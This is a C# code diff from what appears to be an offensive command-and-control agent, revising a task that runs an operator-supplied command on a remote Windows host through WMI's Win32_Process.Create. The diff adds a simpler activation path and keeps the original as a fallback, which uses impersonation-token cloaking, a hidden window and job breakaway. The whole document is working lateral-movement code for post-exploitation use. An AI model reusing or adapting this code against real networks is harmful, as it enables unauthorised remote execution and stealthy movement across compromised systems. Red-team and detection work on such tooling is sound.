@@ -24,6 +24,7 @@ namespace OleViewDotNet.Interop
     [Flags]
     public enum CLSCTX : uint
     {
+        INPROC_SERVER = 0x01,
         REMOTE_SERVER = 0x10,
         ENABLE_CLOAKING = 0x100000
     }
@@ -38,6 +39,8 @@ namespace OleViewDotNet.Interop
     [Flags]
     public enum RPC_AUTHN_LEVEL
     {
+        DEFAULT = 0,
+        CALL = 2,
         PKT_PRIVACY = 6
     }
 
@@ -251,79 +254,32 @@ namespace Tasks
                     // CLSID_WbemLevel1Login does not allow you to immediately query IWbemLevel1Login so you
                     // must query for IUnknown first.
                     var CLSID_WbemLevel1Login = new Guid("8BC3F05E-D86B-11D0-A075-00C04FB68820");
-                    var classContext = CLSCTX.REMOTE_SERVER | CLSCTX.ENABLE_CLOAKING; // ENABLE_CLOAKING makes object creation use our impersonation token
-                    var authInfoPtr = Marshal.AllocCoTaskMem(0x100); // Buffer is larger than what is needed
-                    var authInfo = new COAUTHINFO()
+                    try
                     {
-                        dwAuthnSvc = RpcAuthnService.Default,
-                        dwAuthzSvc = 0,
-                        pwszServerPrincName = null,
-                        dwAuthnLevel = RPC_AUTHN_LEVEL.PKT_PRIVACY,
-                        dwImpersonationLevel = RPC_IMP_LEVEL.IMPERSONATE,
-                        pAuthIdentityData = IntPtr.Zero,
-                        dwCapabilities = RPC_C_QOS_CAPABILITIES.None
-                    };
-                    Marshal.StructureToPtr(authInfo, authInfoPtr, false);
-                    var serverInfoPtr = Marshal.AllocCoTaskMem(0x100); // Buffer is larger than what is needed
-                    var serverInfo = new COSERVERINFO()
-                    {
-                        pwszName = HostName,
-                        pAuthInfo = authInfoPtr
-                    };
-                    Marshal.StructureToPtr(serverInfo, serverInfoPtr, false);
-                    var IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046"); // CLSID_WbemLevel1Login requires IUnknown to be the first interface queried
-                    var multiQi = new MULTI_QI[1];
-                    multiQi[0] = new MULTI_QI(IID_IUnknown);
-                    var coCreateResult = NativeMethods.CoCreateInstanceEx(CLSID_WbemLevel1Login, IntPtr.Zero, classContext, serverInfoPtr, 1, multiQi);
-                    if (coCreateResult >= 0 && multiQi[0].hr == 0)
-                    {
-                        // We need to set the proxy blanket with either STATIC_CLOAKING or DYNAMIC_CLOAKING on
-                        // every interface we acquire to instruct COM to use our current impersonation token
-                        SetProxyBlanket(multiQi[0].pItf);
-                        var wbemLevel1Login = (IWbemLevel1Login)Marshal.GetObjectForIUnknown(multiQi[0].pItf);
-                        SetProxyBlanket(wbemLevel1Login, typeof(IWbemLevel1Login));
-                        // Connect to the required WMI namespace
+
+                        var typeInfo = Type.GetTypeFromCLSID(CLSID_WbemLevel1Login, HostName, true);
+                        var wbemLevel1Login = (IWbemLevel1Login)Activator.CreateInstance(typeInfo);
                         object output = null;
                         var result = wbemLevel1Login.NTLMLogin("ROOT\\CIMV2", null, 0, null, ref output);
+                        // Get the WMI object
                         var wbemServices = (IWbemServices)output;
-                        SetProxyBlanket(wbemServices, typeof(IWbemServices));
-                        // Get an instance of Win32_Process
                         result = wbemServices.GetObject("Win32_Process", 0, null, ref output, null);
                         var win32Process = (IWbemClassObject)output;
-                        SetProxyBlanket(win32Process, typeof(IWbemClassObject));
                         // Get the signature (e.g., the definition) of the input parameters.
                         result = win32Process.GetMethod("Create", 0, ref output, null);
                         var inSignature = (IWbemClassObject)output;
-                        SetProxyBlanket(inSignature, typeof(IWbemClassObject));
+                        // Create an instance of the input parameters for use to set them to
+                        // actual values.
                         inSignature.SpawnInstance(0, ref output);
                         var inParameters = (IWbemClassObject)output;
-                        SetProxyBlanket(inParameters, typeof(IWbemClassObject));
-                        // Get an instance of Win32_ProcessStartup and use it to set the ProcessStartupInformation
-                        // input parameter.
-                        result = wbemServices.GetObject("Win32_ProcessStartup", 0, null, ref output, null);
-                        inSignature = (IWbemClassObject)output;
-                        SetProxyBlanket(inSignature, typeof(IWbemClassObject));
-                        inSignature.SpawnInstance(0, ref output);
-                        var win32ProcessStartupInstance = (IWbemClassObject)output;
-                        SetProxyBlanket(win32ProcessStartupInstance, typeof(IWbemClassObject));
-                        var input = (object)5; // SW_HIDE
-                        result = win32ProcessStartupInstance.Put("ShowWindow", 0, ref input);
-                        input = 0x01000000; // CREATE_BREAKAWAY_FROM_JOB
-                        result = win32ProcessStartupInstance.Put("CreateFlags", 0, ref input);
-                        input = (object)win32ProcessStartupInstance;
-                        result = inParameters.Put("ProcessStartupInformation", 0, ref input);
-                        input = (object)Command;
+                        var input = (object)Command;
                         result = inParameters.Put("CommandLine", 0, ref input);
-                        //input = (object)cwd;
-                        //result = inParameters.Put("CurrentDirectory", 0, ref input);
                         // Execute the Win32_Process:Create and show its output parameters.
                         result = wbemServices.ExecMethod("Win32_Process", "Create", 0, null, inParameters, ref output, null);
                         Object processID = null;
                         Object returnValue = null;
-                        var outParameters = (IWbemClassObject)output;
-                        SetProxyBlanket(outParameters, typeof(IWbemClassObject));
-                        outParameters.Get("ProcessId", 0, ref processID);
-                        outParameters.Get("ReturnValue", 0, ref returnValue);
+                        ((IWbemClassObject)output).Get("ProcessId", 0, ref processID);
+                        ((IWbemClassObject)output).Get("ReturnValue", 0, ref returnValue);
                         if (returnValue.ToString() == "0")
                         {
                             resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) successfully", true, "success");
@@ -332,14 +288,99 @@ namespace Tasks
                         {
                             resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) and executed with error code ({returnValue.ToString()})", true, "error");
                         }
-                        Marshal.FreeCoTaskMem(authInfoPtr);
-                        Marshal.FreeCoTaskMem(serverInfoPtr);
-                    }
-                    else
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                    }catch
                     {
-                        resp = CreateTaskResponse($"failed with error code: {coCreateResult.ToString("X")}", true, "error");
+                        var classContext = CLSCTX.REMOTE_SERVER | CLSCTX.ENABLE_CLOAKING; // ENABLE_CLOAKING makes object creation use our impersonation token
+                        var authInfoPtr = Marshal.AllocCoTaskMem(0x100); // Buffer is larger than what is needed
+                        var authInfo = new COAUTHINFO()
+                        {
+                            dwAuthnSvc = RpcAuthnService.Default,
+                            dwAuthzSvc = 0,
+                            pwszServerPrincName = null,
+                            dwAuthnLevel = RPC_AUTHN_LEVEL.PKT_PRIVACY,
+                            dwImpersonationLevel = RPC_IMP_LEVEL.IMPERSONATE,
+                            pAuthIdentityData = IntPtr.Zero,
+                            dwCapabilities = RPC_C_QOS_CAPABILITIES.None
+                        };
+                        Marshal.StructureToPtr(authInfo, authInfoPtr, false);
+                        var serverInfoPtr = Marshal.AllocCoTaskMem(0x100); // Buffer is larger than what is needed
+                        var serverInfo = new COSERVERINFO()
+                        {
+                            pwszName = HostName,
+                            pAuthInfo = authInfoPtr
+                        };
+                        Marshal.StructureToPtr(serverInfo, serverInfoPtr, false);
+                        var IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046"); // CLSID_WbemLevel1Login requires IUnknown to be the first interface queried
+                        var multiQi = new MULTI_QI[1];
+                        multiQi[0] = new MULTI_QI(IID_IUnknown);
+                        var coCreateResult = NativeMethods.CoCreateInstanceEx(CLSID_WbemLevel1Login, IntPtr.Zero, classContext, serverInfoPtr, 1, multiQi);
+                        if (coCreateResult >= 0 && multiQi[0].hr == 0)
+                        {
+                            // We need to set the proxy blanket with either STATIC_CLOAKING or DYNAMIC_CLOAKING on
+                            // every interface we acquire to instruct COM to use our current impersonation token
+                            SetProxyBlanket(multiQi[0].pItf);
+                            var wbemLevel1Login = (IWbemLevel1Login)Marshal.GetObjectForIUnknown(multiQi[0].pItf);
+                            SetProxyBlanket(wbemLevel1Login, typeof(IWbemLevel1Login));
+                            // Connect to the required WMI namespace
+                            object output = null;
+                            var result = wbemLevel1Login.NTLMLogin("ROOT\\CIMV2", null, 0, null, ref output);
+                            var wbemServices = (IWbemServices)output;
+                            SetProxyBlanket(wbemServices, typeof(IWbemServices));
+                            // Get an instance of Win32_Process
+                            result = wbemServices.GetObject("Win32_Process", 0, null, ref output, null);
+                            var win32Process = (IWbemClassObject)output;
+                            SetProxyBlanket(win32Process, typeof(IWbemClassObject));
+                            // Get the signature (e.g., the definition) of the input parameters.
+                            result = win32Process.GetMethod("Create", 0, ref output, null);
+                            var inSignature = (IWbemClassObject)output;
+                            SetProxyBlanket(inSignature, typeof(IWbemClassObject));
+                            inSignature.SpawnInstance(0, ref output);
+                            var inParameters = (IWbemClassObject)output;
+                            SetProxyBlanket(inParameters, typeof(IWbemClassObject));
+                            // Get an instance of Win32_ProcessStartup and use it to set the ProcessStartupInformation
+                            // input parameter.
+                            result = wbemServices.GetObject("Win32_ProcessStartup", 0, null, ref output, null);
+                            inSignature = (IWbemClassObject)output;
+                            SetProxyBlanket(inSignature, typeof(IWbemClassObject));
+                            inSignature.SpawnInstance(0, ref output);
+                            var win32ProcessStartupInstance = (IWbemClassObject)output;
+                            SetProxyBlanket(win32ProcessStartupInstance, typeof(IWbemClassObject));
+                            var input = (object)5; // SW_HIDE
+                            result = win32ProcessStartupInstance.Put("ShowWindow", 0, ref input);
+                            input = 0x01000000; // CREATE_BREAKAWAY_FROM_JOB
+                            result = win32ProcessStartupInstance.Put("CreateFlags", 0, ref input);
+                            input = (object)win32ProcessStartupInstance;
+                            result = inParameters.Put("ProcessStartupInformation", 0, ref input);
+                            input = (object)Command;
+                            result = inParameters.Put("CommandLine", 0, ref input);
+                            //input = (object)cwd;
+                            //result = inParameters.Put("CurrentDirectory", 0, ref input);
+                            // Execute the Win32_Process:Create and show its output parameters.
+                            result = wbemServices.ExecMethod("Win32_Process", "Create", 0, null, inParameters, ref output, null);
+                            Object processID = null;
+                            Object returnValue = null;
+                            var outParameters = (IWbemClassObject)output;
+                            SetProxyBlanket(outParameters, typeof(IWbemClassObject));
+                            outParameters.Get("ProcessId", 0, ref processID);
+                            outParameters.Get("ReturnValue", 0, ref returnValue);
+                            if (returnValue.ToString() == "0")
+                            {
+                                resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) successfully", true, "success");
+                            }
+                            else
+                            {
+                                resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) and executed with error code ({returnValue.ToString()})", true, "error");
+                            }
+                            Marshal.FreeCoTaskMem(authInfoPtr);
+                            Marshal.FreeCoTaskMem(serverInfoPtr);
+                        }
+                        else
+                        {
+                            resp = CreateTaskResponse($"failed with error code: {coCreateResult.ToString("X")}", true, "error");
+                        }
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                     }
-                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                     return;
                 }
                 //Original version using wmi v1
